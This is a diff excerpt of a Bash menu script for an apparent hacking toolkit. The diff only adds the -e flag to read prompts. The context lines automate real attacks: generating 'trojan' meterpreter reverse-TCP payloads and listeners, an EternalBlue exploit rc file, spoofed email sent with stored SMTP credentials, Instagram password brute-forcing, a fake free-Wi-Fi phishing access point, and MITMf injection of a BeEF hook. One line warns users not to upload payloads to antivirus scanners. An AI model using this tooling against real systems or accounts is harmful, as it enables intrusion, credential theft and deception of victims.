 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_infoga
@@ -5533,7 +5533,7 @@ function information_gathering
 				cd
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_knockmail
@@ -5552,7 +5552,7 @@ function information_gathering
 				cd
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_operative
@@ -5578,7 +5578,7 @@ function information_gathering
 					echo -e ""$YS" b"$CE") Go back"
 					echo -e ""$YS"00"$CE") Main menu"
 				#	echo -e ""$YS" 0"$CE") Exit"
-					read -p $'(\e[5;34mOSRFCONSOLE\e[0m)> ' OSFR
+					read -e -p $'(\e[5;34mOSRFCONSOLE\e[0m)> ' OSFR
 					clear
 					if [[ "$OSFR" = "1" ]]
 					then
@@ -5631,7 +5631,7 @@ function information_gathering
 				done
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_osrframework
@@ -5736,7 +5736,7 @@ function website_tools
 		fi
 		echo -e ""$YS" b"$CE") Go back"
 		echo -e ""$YS"00"$CE") Main menu"
-		read -p $'(\e[4;34mwebsite\e[0m)> ' WEB
+		read -e -p $'(\e[4;34mwebsite\e[0m)> ' WEB
 		clear
 		if [[ "$WEB" = 1 ]]
 		then
@@ -5745,7 +5745,7 @@ function website_tools
 				sqlmap_menu
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_sqlmap
@@ -5761,7 +5761,7 @@ function website_tools
 				python leviathan.py
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_leviathan
@@ -5777,7 +5777,7 @@ function website_tools
 				python nosqlmap.py
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_nosqlmap
@@ -5795,7 +5795,7 @@ function website_tools
 				$READAK
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_yuki
@@ -5813,7 +5813,7 @@ function website_tools
 				$READAK
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_blazy
@@ -5831,7 +5831,7 @@ function website_tools
 				$READAK
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_striker
@@ -5849,7 +5849,7 @@ function website_tools
 				$READAK
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_hyprpulse
@@ -5867,7 +5867,7 @@ function website_tools
 				$READAK
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_instaburst
@@ -5890,14 +5890,14 @@ function website_tools
 					echo -e " "$YS"3"$CE") View cracked passwords"
 					echo -e " "$YS"4"$CE") Create configuration"
 					echo -e " "$YS"b"$CE") Go back"
-					read -p $'(\e[4;34minstahack\e[0m)> ' C
+					read -e -p $'(\e[4;34minstahack\e[0m)> ' C
 					clear
 					if [[ "$C" == 1 ]]
 					then
 						echo -e ""$YS"Username: "$CE""
-						read -p $'(\e[4;93musername\e[0m)> ' USRNM
+						read -e -p $'(\e[4;93musername\e[0m)> ' USRNM
 						echo -e ""$YS"Wordlist path: "$CE""
-						read -p $'(\e[4;93mpath\e[0m)> ' WRDLST
+						read -e -p $'(\e[4;93mpath\e[0m)> ' WRDLST
 						if [[ ! -f "$WRDLST" ]]
 						then
 							echo -e ""$RS"File not found"$CE""
@@ -5910,9 +5910,9 @@ function website_tools
 					elif [[ "$C" == 2 ]]
 					then
 						echo -e ""$YS"Username: "$CE""
-						read -p $'(\e[4;93musername\e[0m)> ' USRNM
+						read -e -p $'(\e[4;93musername\e[0m)> ' USRNM
 						echo -e ""$YS"Wordlist path: "$CE""
-						read -p $'(\e[4;93mpath\e[0m)> ' WRDLST
+						read -e -p $'(\e[4;93mpath\e[0m)> ' WRDLST
 						if [[ ! -f "$WRDLST" ]]
 						then
 							echo -e ""$RS"File not found"$CE""
@@ -5925,7 +5925,7 @@ function website_tools
 					elif [[ "$C" == 3 ]]
 					then
 						echo -e ""$YS"Username: "$CE""
-						read -p $'(\e[4;93musername\e[0m)> ' USRNM
+						read -e -p $'(\e[4;93musername\e[0m)> ' USRNM
 						instagram-py -i "$USRNM"
 						echo -e "$PAKTGB"
 						$READAK
@@ -5956,7 +5956,7 @@ function website_tools
 				done
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_instagram-py
@@ -5976,7 +5976,7 @@ function website_tools
 				$READAK
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_datasploit
@@ -5994,7 +5994,7 @@ function website_tools
 				$READAK
 			else
 				echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_sitebroker
@@ -6079,7 +6079,7 @@ do
 	fi
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS" 0"$CE") Exit"
-	read -p $'(\e[4;33mothertools\e[0m)> ' OTHERT
+	read -e -p $'(\e[4;33mothertools\e[0m)> ' OTHERT
 	clear
 	if [[ "$OTHERT" = 1 ]]
 	then
@@ -6088,7 +6088,7 @@ do
 			geany
 		else
 			echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_geany
@@ -6104,7 +6104,7 @@ do
 			dagon_script
 		else
 			echo -e "$TNI"
-				read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+				read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 				if [[ "$INSTALL" = "install" ]]
 				then
 					install_dagon
@@ -6122,7 +6122,7 @@ do
 			cd
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_lalin
@@ -6141,7 +6141,7 @@ do
 			$READAK	
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_cupp
@@ -6156,7 +6156,7 @@ do
 			bleachbit		
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_bleachbit
@@ -6174,7 +6174,7 @@ do
 			$READAK	
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_hashbuster
@@ -6191,7 +6191,7 @@ do
 			$READAK	
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_patator
@@ -6224,7 +6224,7 @@ function findsploit_menu
 {
 	clear
 	echo -e "Search: "
-	read -p $'(\e[4;93msearch\e[0m)> ' FSEARCH
+	read -e -p $'(\e[4;93msearch\e[0m)> ' FSEARCH
 	findsploit "$FSEARCH"
 	echo -e "$PAKTGB"
 	$READAK
@@ -6250,13 +6250,13 @@ function metasploit_menu
 	echo -e ""$YS" 7"$CE") Findsploit"
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS" 0"$CE") Exit"
-	read -p $'(\e[4;35mmetasploit\e[0m)> ' METASP
+	read -e -p $'(\e[4;35mmetasploit\e[0m)> ' METASP
 	clear
 	if [[ "$METASP" = "1" ]]
 	then
 		PAYLOADL=""
 		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
-		read -p $'(\e[4;93mpayload\e[0m)> ' PAYLOADL
+		read -e -p $'(\e[4;93mpayload\e[0m)> ' PAYLOADL
 		if [[ -z "$PAYLOADL" ]]
 		then
 			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
@@ -6265,16 +6265,16 @@ function metasploit_menu
 		fi
 		echo -e ""
 		echo -e "LHOST: "
-		read -p $'(\e[4;93mlhost\e[0m)> ' ATIP
+		read -e -p $'(\e[4;93mlhost\e[0m)> ' ATIP
 		echo -e ""
 		echo -e "LPORT: "
-		read -p $'(\e[4;93mlport\e[0m)> ' ATPORT
+		read -e -p $'(\e[4;93mlport\e[0m)> ' ATPORT
 		echo -e ""
 		echo -e "Enter the target's architecture("$YS"x86"$CE"/"$YS"x64"$CE"): "
-		read -p $'(\e[4;93march\e[0m)> ' TARCH
+		read -e -p $'(\e[4;93march\e[0m)> ' TARCH
 		echo -e ""
 		echo -e "Enter the name of the payload(e.g: "$YS"trojan2"$CE"): "
-		read -p $'(\e[4;93mname\e[0m)> ' ATEXE
+		read -e -p $'(\e[4;93mname\e[0m)> ' ATEXE
 		ATEXEPATH="/root/Desktop/$ATEXE.exe"
 		clear
 		echo -e "Generating"
@@ -6302,11 +6302,11 @@ function metasploit_menu
 		$READAK
 		clear
 		echo -e "Create a listener for this payload? $YNYES "
-		read -p $'(\e[4;93mcreate\e[0m)> ' PAYL
+		read -e -p $'(\e[4;93mcreate\e[0m)> ' PAYL
 		if [[ "$PAYL" != "n" ]]
 		then
 			echo -e "Name of listener(e.g: "$YS"john"$CE") : "
-			read -p $'(\e[4;93mname\e[0m)> ' NAMEL
+			read -e -p $'(\e[4;93mname\e[0m)> ' NAMEL
 			echo "use exploit/multi/handler" > "$EPATH"/rc/"$NAMEL".rc
 			echo "set PAYLOAD $PAYLOADL " >> "$EPATH"/rc/"$NAMEL".rc
 			echo "set LHOST $ATIP " >> "$EPATH"/rc/"$NAMEL".rc
@@ -6315,7 +6315,7 @@ function metasploit_menu
 			echo "exploit -j" >> "$EPATH"/rc/"$NAMEL".rc
 			clear
 			echo -e "Launch the listener now? "$YNONLY""
-			read -p $'(\e[4;93mlaunch\e[0m)> ' LLN
+			read -e -p $'(\e[4;93mlaunch\e[0m)> ' LLN
 			if [[ "$LLN" = "y" ]]
 			then
 				echo -e "Launching msfconsole..."
@@ -6330,7 +6330,7 @@ function metasploit_menu
 		echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
 		sleep 3
 		echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
-		read -p $'(\e[4;93magree\e[0m)> ' MUSTBEYES
+		read -e -p $'(\e[4;93magree\e[0m)> ' MUSTBEYES
 		if [[ "$MUSTBEYES" = "YES" ]] 
 		then 
 			clear
@@ -6341,13 +6341,13 @@ function metasploit_menu
 	then
 		clear
 		echo -e "LHOST: "
-		read -p $'(\e[4;93mlhost\e[0m)> ' LHOSTL
+		read -e -p $'(\e[4;93mlhost\e[0m)> ' LHOSTL
 		echo -e ""
 		echo -e "LPORT: "
-		read -p $'(\e[4;93mlport\e[0m)> ' LPORTL
+		read -e -p $'(\e[4;93mlport\e[0m)> ' LPORTL
 		echo -e ""
 		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
-		read -p $'(\e[4;93mpayload\e[0m)> ' PAYLOADL
+		read -e -p $'(\e[4;93mpayload\e[0m)> ' PAYLOADL
 		if [[ -z "$PAYLOADL" ]]
 		then
 			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
@@ -6355,7 +6355,7 @@ function metasploit_menu
 			PAYLOADL="windows/meterpreter/reverse_tcp"
 		fi
 		echo -e "Name of listener(e.g: "$YS"john"$CE") : "
-		read -p $'(\e[4;93mname\e[0m)> ' NAMEL
+		read -e -p $'(\e[4;93mname\e[0m)> ' NAMEL
 		echo "use exploit/multi/handler" > "$EPATH"/rc/"$NAMEL".rc
 		echo "set PAYLOAD $PAYLOADL " >> "$EPATH"/rc/"$NAMEL".rc
 		echo "set LHOST $LHOSTL " >> "$EPATH"/rc/"$NAMEL".rc
@@ -6364,7 +6364,7 @@ function metasploit_menu
 		echo "exploit -j" >> "$EPATH"/rc/"$NAMEL".rc
 		clear
 		echo -e "Launch the listener now? "$YNONLY""
-		read -p $'(\e[4;93mlaunch\e[0m)> ' LLN
+		read -e -p $'(\e[4;93mlaunch\e[0m)> ' LLN
 		if [[ "$LLN" = "y" ]]
 		then
 			echo -e "Launching msfconsole..."
@@ -6383,7 +6383,7 @@ function metasploit_menu
 		echo -e "Enter the name of the listener you want to select(e.g: "$YS"john"$CE")"
 		echo -e ""$YS" r"$CE") Delete all saved listeners"
 		echo -e ""$YS" b"$CE") Go back"
-		read -p $'(\e[4;93mlistener\e[0m)> ' NAMERC
+		read -e -p $'(\e[4;93mlistener\e[0m)> ' NAMERC
 		clear
 		if [[ "$NAMERC" = "back" || "$NAMERC" = "b" ]]
 		then
@@ -6410,7 +6410,7 @@ function metasploit_menu
 		echo -e ""$YS" 1"$CE") Start listener"
 		echo -e ""$YS" 2"$CE") Delete listener"
 		echo -e ""$YS" b"$CE") Go back"
-		read -p $'(\e[4;93mlistener\e[0m)> ' LISTL
+		read -e -p $'(\e[4;93mlistener\e[0m)> ' LISTL
 		if [[ "$LISTL" = "1" ]]
 		then
 			msfconsole -r "$EPATH"/rc/"$NAMERC"
@@ -6480,7 +6480,7 @@ function update_ehtools
 			$READAK
 			clear
 			echo -e "Do you want to update?"$YNONLY": "
-			read -p $'(\e[4;93mupdate\e[0m\en)> ' UPDATEYN
+			read -e -p $'(\e[4;93mupdate\e[0m\en)> ' UPDATEYN
 			if [[ "$UPDATEYN" = "y" ]]
 			then
 				clear
@@ -6627,7 +6627,7 @@ function interface_menu
 	echo -e "Your current wireless interface names are $WLANN and $WLANNM"
 	sleep 2
 	echo -e "Do you want to change you interface names?"$YNYES": "
-	read -p $'(\e[4;93mchange\e[0m)> ' INAG
+	read -e -p $'(\e[4;93mchange\e[0m)> ' INAG
 	if [[ "$INAG" = "n" ]]
 	then
 		clear
@@ -6658,7 +6658,7 @@ function tools_menu
 	echo -e ""$YS" b"$CE") Go back"
 	#~ echo -e ""$YS"00"$CE") Main menu"
 	echo -e ""$YS" 0"$CE") Exit"
-	read -p $'(\e[4;32mtools\e[0m)> ' CATEG
+	read -e -p $'(\e[4;32mtools\e[0m)> ' CATEG
 	clear
 		if [[ "$CATEG" = "1" ]]
 		then
@@ -6769,15 +6769,15 @@ function eternalblue
 	else
 		echo -e "LHOST: "
 	fi
-	read -p $'(\e[4;93mlhost\e[0m)> ' LHOSTL
+	read -e -p $'(\e[4;93mlhost\e[0m)> ' LHOSTL
 	if [[ "$EG" != "" && "$LHOSTL" = "" ]]
 	then
 		LHOSTL="$EG"
 	fi
 	echo -e "RHOST: "
-	read -p $'(\e[4;93mrhost\e[0m)> ' RHOSTL
+	read -e -p $'(\e[4;93mrhost\e[0m)> ' RHOSTL
 	echo -e "TARGETARCHITECTURE("$YS"x86"$CE"/"$YS"x64"$CE"): "
-	read -p $'(\e[4;93march\e[0m)> ' TARGETARCHL
+	read -e -p $'(\e[4;93march\e[0m)> ' TARGETARCHL
 	if [[ "$TARGETARCHL" = "x64" ]]
 	then
 		PROCESSINJECTL="lsass.exe"
@@ -6786,7 +6786,7 @@ function eternalblue
 		PAYLOADL="windows/meterpreter/reverse_tcp"
 	fi
 	echo -e "TARGET("$YS"0"$CE"-"$YS"8"$CE"): "
-	read -p $'(\e[4;93mtarget\e[0m)> ' TARGETL
+	read -e -p $'(\e[4;93mtarget\e[0m)> ' TARGETL
 	echo "use exploit/windows/smb/eternalblue_doublepulsar" > "$EPATH"/rce/eternalbluerc.rc
 	echo "set LHOST "$LHOSTL"" >> "$EPATH"/rce/eternalbluerc.rc
 	echo "set RHOST "$RHOSTL"" >> "$EPATH"/rce/eternalbluerc.rc
@@ -6806,7 +6806,7 @@ function eternalblue_check
 		mkdir	"$EPATH"/rce
 	fi
 	echo -e "RHOST:("$BS"if scanning multiple hosts, seperate with space"$CE") "
-	read -p $'(\e[4;93mrhost\e[0m)> ' RHOSTL
+	read -e -p $'(\e[4;93mrhost\e[0m)> ' RHOSTL
 	echo "use auxiliary/scanner/smb/smb_ms17_010" > "$EPATH"/rce/eternalbluerc.rc
 	echo "set RHOSTS "$RHOSTL"" >> "$EPATH"/rce/eternalbluerc.rc
 	echo "exploit" >> "$EPATH"/rce/eternalbluerc.rc
@@ -6913,14 +6913,14 @@ do
 	echo -e ""$YS" 4"$CE") Fix email failed"
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS" 0"$CE") Exit"
-	read -p $'(\e[4;33mspoof\e[0m)> ' SMTP
+	read -e -p $'(\e[4;33mspoof\e[0m)> ' SMTP
 	if [[ "$SMTP" = "1" ]]
 	then
 		clear
 		echo -e "Enter your SMTP username (find it here: https://app.smtp2go.com/settings/users): "
-		read -p $'(\e[4;93musername\e[0m)> ' SMTPEMAIL
+		read -e -p $'(\e[4;93musername\e[0m)> ' SMTPEMAIL
 		echo -e "Enter your SMTP password (find it here: https://app.smtp2go.com/settings/users): "
-		read -p $'(\e[4;93mpassword\e[0m)> ' SMTPPASS
+		read -e -p $'(\e[4;93mpassword\e[0m)> ' SMTPPASS
 		clear
 		echo "$SMTPEMAIL" > /bin/ehtools/smtp/smtpemail.txt
 		echo "$SMTPPASS" > /bin/ehtools/smtp/smtppass.txt 
@@ -6991,21 +6991,21 @@ do
 		echo -e "Your username is "$RS""$smtpemail""$CE""
 		echo -e ""
 		echo -e "Enter the target's email: "
-		read -p $'(\e[4;93mtarget\e[0m)> ' TARGETSEMAIL
+		read -e -p $'(\e[4;93mtarget\e[0m)> ' TARGETSEMAIL
 		echo -e "Enter the email that you want the target to see: "
-		read -p $'(\e[4;93memail\e[0m)> ' SPOOFEDEMAIL
+		read -e -p $'(\e[4;93memail\e[0m)> ' SPOOFEDEMAIL
 		echo -e "Enter the subject of the message: "
-		read -p $'(\e[4;93msubject\e[0m)> ' SUBJECTEMAIL
+		read -e -p $'(\e[4;93msubject\e[0m)> ' SUBJECTEMAIL
 		echo -e "Enter the message: "
-		read -p $'(\e[4;93mmessage\e[0m)> ' MESSAGEEMAIL
+		read -e -p $'(\e[4;93mmessage\e[0m)> ' MESSAGEEMAIL
 		echo -e "Enter the SMTP server ("$YS"Enter"$CE"=mail.smtp2go.com): "
-		read -p $'(\e[4;93mserver\e[0m)> ' SMTPSERVER
+		read -e -p $'(\e[4;93mserver\e[0m)> ' SMTPSERVER
 		if [[ "$SMTPSERVER" = "" ]]
 		then
 			SMTPSERVER="mail.smtp2go.com"
 		fi
 		echo -e "Enter the SMTP port ("$YS"Enter"$CE"=2525): "
-		read -p $'(\e[4;93mport\e[0m)> ' SMTPPORT
+		read -e -p $'(\e[4;93mport\e[0m)> ' SMTPPORT
 		if [[ "$SMTPPORT" = "" ]]
 		then
 			SMTPPORT="2525"
@@ -7038,7 +7038,7 @@ function new_terminal
 		echo -e "Monitor mode is not enabled."
 		echo -e ""
 		echo -e "Do you want to enable monitor mode? "$YNYES": "
-		read -p $'(\e[4;93menable\e[0m)> ' MONITOREN
+		read -e -p $'(\e[4;93menable\e[0m)> ' MONITOREN
 		clear
 		if [[ "$MONITOREN" = "n" ]]
 		then
@@ -7132,7 +7132,7 @@ function wififb_attack
 		echo -e ""$YS" 5"$CE") Delete the all-saved-passwords file"
 		echo -e ""$YS" 6"$CE") Fix no wifi issue after the attack"
 		echo -e ""$YS" b"$CE") Go back"
-		read -p $'(\e[4;31mwififb\e[0m)> ' wifimenu
+		read -e -p $'(\e[4;31mwififb\e[0m)> ' wifimenu
 		clear
 		if [[ "$wifimenu" == 1 ]]
 		then
@@ -7186,7 +7186,7 @@ function wififb
 	echo -e ""$YS"11"$CE") FREE PUBLIC WIFI"
 	echo -e " "$YS"c"$CE") Custom name"
 	echo -e " "$YS"b"$CE") Go back"
-	read -p $'(\e[4;31mwififb\e[0m)> ' wifiind
+	read -e -p $'(\e[4;31mwififb\e[0m)> ' wifiind
 	if [[ "$wifiind" == 1 ]]
 	then
 		wifiname="Free Wifi"
@@ -7234,7 +7234,7 @@ function wififb
 	then
 		clear
 		echo -e "Custom access point name:"
-		read -p $'(\e[4;93mname\e[0m)> ' wifiname
+		read -e -p $'(\e[4;93mname\e[0m)> ' wifiname
 	elif [[ "$wifiind" == 'b' || "$wifiind" == 'back' ]]
 	then
 		wififb_attack
@@ -7380,12 +7380,12 @@ do
 		echo -e ""$YS" s"$CE") Start"
 	fi
 	echo -e ""$YS" b"$CE") Go back"
-	read -p $'(\e[4;36mSQconsole\e[0m)> ' SQ
+	read -e -p $'(\e[4;36mSQconsole\e[0m)> ' SQ
 	clear
 	if [[ "$SQ" = 1 ]]
 	then
 		echo -e "URL: "
-		read -p $'(\e[4;93murl\e[0m)> ' URLL
+		read -e -p $'(\e[4;93murl\e[0m)> ' URLL
 		if [[ "$URLL" != "" || "$URLL" = "b" ]]
 		then
 			URL="$URLL"
@@ -7471,7 +7471,7 @@ do
 			echo -e ""$YS" d"$CE") Deselect all"
 			echo -e ""$YS" s"$CE") Save selection"
 			echo -e ""$YS" b"$CE") Go back"
-			read -p $'(\e[4;31mselect\e[0m)> ' COCH
+			read -e -p $'(\e[4;31mselect\e[0m)> ' COCH
 			clear
 			if [[ "$COCH" = "b" || "$COCH" = "back" ]]
 			then
@@ -7591,7 +7591,7 @@ do
 				n9=$((n9+1))
 			done
 			echo -e ""$YS" b"$CE") Go back"
-			read -p $'(\e[5;34mtables\e[0m)> ' TCH
+			read -e -p $'(\e[5;34mtables\e[0m)> ' TCH
 			if [[ "$TCH" = "b" || "$TCH" = "back" ]]
 			then
 				break
@@ -7678,7 +7678,7 @@ do
 				n8=$((n8+1))
 			done
 			echo -e ""$YS" b"$CE") Go back"
-			read -p $'(\e[5;34mdatabases\e[0m)> ' DCH
+			read -e -p $'(\e[5;34mdatabases\e[0m)> ' DCH
 			clear
 			if [[ "$DCH" = "b" || "$DCH" = "back" ]]
 			then
@@ -7815,12 +7815,12 @@ function cromos_menu
 			echo -e " "$YS"5"$CE") Upload to dropbox"
 			echo -e " "$YS"b"$CE") Go back"
 			echo -e " "$YS"0"$CE") Exit"
-			read -p $'(\e[4;34mcromos\e[0m)> ' CROM
+			read -e -p $'(\e[4;34mcromos\e[0m)> ' CROM
 			clear
 			if [[ "$CROM" == 1 ]]
 			then
 				echo -e "Extension ID: "
-				read -p $'(\e[4;93mID\e[0m)> ' EXID
+				read -e -p $'(\e[4;93mID\e[0m)> ' EXID
 				python cromos.py --extension "$EXID" && CEX=""$YS"$EXID"$CE""
 				sleep 2
 			elif [[ "$CROM" == 2 ]]
@@ -7838,7 +7838,7 @@ function cromos_menu
 			elif [[ "$CROM" == 4 ]]
 			then
 				echo -e "File type to build to("$YS"Enter"$CE"="$YS"bat"$CE"):"
-				read -p $'(\e[4;93mfile\e[0m)> ' buildext
+				read -e -p $'(\e[4;93mfile\e[0m)> ' buildext
 				if [[ "$buildext" == "" ]]
 				then
 					buildext="bat"
@@ -7849,7 +7849,7 @@ function cromos_menu
 			elif [[ "$CROM" == 5 ]]
 			then
 				echo -e "Token: "
-				read -p $'(\e[4;93mtoken\e[0m)> ' CTOK
+				read -e -p $'(\e[4;93mtoken\e[0m)> ' CTOK
 				python cromos.py --extension "$EXID" --token "$CTOK"
 				echo -e "$PAKTGB"
 				$READAK
@@ -7903,7 +7903,7 @@ function mitmf_hook
 			in[$n]="$WLANNM"
 			n=$((n+1))
 		fi
-		read -p $'(\e[4;33mhook\e[0m)> ' ints
+		read -e -p $'(\e[4;33mhook\e[0m)> ' ints
 		if [[ "$ints" -le "$n" && "$ints" -ge 1 ]]
 		then
 			#~ echo -e "You selected "$YS"${in[$ints]}"$CE"" #debugging
@@ -7914,7 +7914,7 @@ function mitmf_hook
 			export mitmfgate
 			clear
 			echo -e "Target's IP: "
-			read -p $'(\e[4;93mtarget\e[0m)> ' mitmftar
+			read -e -p $'(\e[4;93mtarget\e[0m)> ' mitmftar
 			TEST=$(ifconfig | grep $mitmfint)
 			if [[ $TEST != "" ]]
 			then
@@ -7924,7 +7924,7 @@ function mitmf_hook
 			fi
 			clear
 			echo -e "hook.js URL path("$YS"Enter"$CE"=http://"$mitmflocalip":3000/hook.js): "
-			read -p $'(\e[4;93murl\e[0m)> ' hookch
+			read -e -p $'(\e[4;93murl\e[0m)> ' hookch
 			if [[ "$hookch" = "" ]]
 			then
 				mitmfhook="http://"$mitmflocalip":3000/hook.js"
@@ -7939,7 +7939,7 @@ function mitmf_hook
 		fi
 	else
 		echo -e "$TNI"
-		read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+		read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 		if [[ "$INSTALL" = "install" ]]
 		then
 			echo -e ""$RS"No installation added yet"$CE""
@@ -8012,7 +8012,7 @@ do
 	echo -e ""$YS"bu"$CE") Burpsuite automated tool"
 	echo -e ""$YS" i"$CE") Info"
 	echo -e ""$YS" b"$CE") Go back"
-	read -p $'(\e[4;33mbruteforce\e[0m)> ' BR
+	read -e -p $'(\e[4;33mbruteforce\e[0m)> ' BR
 	clear
 	if [[ "$BR" = "b" || "$BR" = 00 || "$BR" = "back" ]]
 	then
@@ -8075,11 +8075,11 @@ do
 	elif [[ "$BR" = 2 ]]
 	then
 		echo -e "Username: "
-		read -p $'(\e[4;93musername\e[0m)> ' US
+		read -e -p $'(\e[4;93musername\e[0m)> ' US
 	elif [[ "$BR" = 3 ]]
 	then
 		echo -e "Wordlist: "
-		read -p $'(\e[4;93mwordlist\e[0m)> ' WL
+		read -e -p $'(\e[4;93mwordlist\e[0m)> ' WL
 		if [[ ! -f "$WL" ]]
 		then
 			WL=""
@@ -8092,22 +8092,22 @@ do
 	elif [[ "$BR" = 4 ]]
 	then
 		echo -e "Request URI: "
-		read -p $'(\e[4;93murl\e[0m)> ' RQ
+		read -e -p $'(\e[4;93murl\e[0m)> ' RQ
 		rqq=1
 	elif [[ "$BR" = 5 ]]
 	then
 		echo -e "^USER^ & ^PASS^ field: "
-		read -p $'(\e[4;93mfield\e[0m)> ' UP
+		read -e -p $'(\e[4;93mfield\e[0m)> ' UP
 		upp=1
 	elif [[ "$BR" = 6 ]]
 	then
 		echo -e "Invalid pass string: "
-		read -p $'(\e[4;93mstring\e[0m)> ' IS
+		read -e -p $'(\e[4;93mstring\e[0m)> ' IS
 		iss=1
 	elif [[ "$BR" = 7 ]]
 	then
 		echo -e "Form: "
-		read -p $'(\e[4;93mform\e[0m)> ' FM
+		read -e -p $'(\e[4;93mform\e[0m)> ' FM
 	elif [[ "$BR" = 8 ]]
 	then
 		if [[ "$bin" != 1 ]]
@@ -8206,7 +8206,7 @@ do
 		fi
 		clear
 		echo -e ""$RS"Do you have permission to bruteforce this network?"$CE""$YNONLY""
-		read -p $'(\e[4;93mpermission\e[0m)> ' PERM
+		read -e -p $'(\e[4;93mpermission\e[0m)> ' PERM
 		if [[ "$PERM" != "y" && "$PERM" != "Y" ]]
 		then
 			echo -e ""$RS"You cannot proceed then"$CE""
@@ -8326,7 +8326,7 @@ function select_interface
 		fi
 		echo -e ""$YS" 3"$CE") Manually type an interface"
 		echo -e ""$YS" b"$CE") Go back"
-		read -p $'(\e[4;31mmenu\e[0m)> ' CI
+		read -e -p $'(\e[4;31mmenu\e[0m)> ' CI
 		if [[ "$CI" = 1 ]]
 		then
 			TT=$(ifconfig | grep "$WLANN:")
